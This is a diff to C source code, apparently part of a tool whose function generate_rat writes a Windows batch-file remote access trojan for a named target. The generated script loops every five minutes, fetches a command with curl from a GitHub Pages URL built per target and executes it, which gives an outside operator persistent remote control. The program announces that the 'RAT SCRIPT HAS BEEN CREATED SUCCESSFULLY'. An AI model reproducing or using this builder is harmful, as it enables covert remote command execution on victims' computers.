@@ -9,59 +9,88 @@ char github_link[30] = "samjoel2007.github.io/";
 char target_dir[50];
 
 void generate_rat(char Target[] , char file_name[]) {
-	strcpy(target_dir, Target);
-	strcat(github_link, github_repo);
-	strcat(github_link, Target);
-	strcat(github_link, "/");
-	printf("Target = %s", Target);
-	printf("\nCreating File: %s", file_name);
-	char c[100];
-	strcpy(c, Target);
-	char format[10] = ".txt";
-	strcat(c, format);
-	// C -> TARGET
-	char filef[100];
-	strcpy(filef, c);
-	
-	char t[100];
-	char sl[100] = "/";
-	char f[100];
-	strcpy(t, Target);
-	strcpy(f, file_name);
-	char make_dir[50] = "mkdir ";
-	strcat(make_dir, Target);
-	system(make_dir);
-	
-	// PATH BULLSHIT CONCAT
-	strcat(t, sl);
-	strcat(t, f);
-	printf("\n%s",t);
-	
-	// LINKS
-	strcat(github_link, c);
-	printf("\n%s", github_link);
-	
-	
-	FILE *fptr;
-	fptr = fopen(t, "w");
+strcpy(target_dir, Target);
 
-fprintf(fptr,
+strcat(github_link, github_repo);
+strcat(github_link, Target);
+strcat(github_link, "/");
+
+printf("Target = %s", Target);
+printf("\nCreating File: %s", file_name);
+
+char c[100];
+strcpy(c, Target);
+
+char format[] = ".txt";
+strcat(c, format);
+
+/* FILE NAME */
+char filef[100];
+strcpy(filef, c);
+
+/* CREATE PATH */
+char t[100];
+char sl[] = "/";
+char f[100];
+
+strcpy(t, Target);
+strcpy(f, file_name);
+
+/* CREATE DIRECTORY */
+char make_dir[100] = "mkdir ";
+
+strcat(make_dir, Target);
+
+system(make_dir);
+
+/* FINAL PATH */
+strcat(t, sl);
+strcat(t, f);
+
+printf("\nPATH = %s", t);
+
+/* GITHUB LINK */
+strcat(github_link, c);
+
+printf("\nLINK = %s", github_link);
+
+/* CREATE BAT FILE */
+FILE *fptr;
+
+fptr = fopen(t, "w");
+
+if (fptr == NULL) {
+    printf("\nFailed to create file");
+    return;
+}
+
+fprintf(
+    fptr,
+
     "@echo off\n"
     "setlocal enabledelayedexpansion\n\n"
 
     ":loop\n"
-    "curl -s \"%s\" > temp_cmd.txt\n"
-    "set /p command=<temp_cmd.txt\n"
+
+    "curl -s \"%s\" > temp_cmd.txt\n\n"
+
+    "set /p command=<temp_cmd.txt\n\n"
+
     "del temp_cmd.txt\n\n"
 
-    "%%command%%\n\n"
+    "echo Executing: !command!\n\n"
+
+    "call !command!\n\n"
 
     "timeout /t 300 /nobreak >nul\n"
+
     "goto loop\n",
+
     github_link
 );
 
-	fclose(fptr);
+fclose(fptr);
+
 	printf("\nRAT SCRIPT HAS BEEN CREATED SUCCESSFULLY");
 	//printf("\n GENERATING mover.bat FILE PLEASE WAIT...");
 	
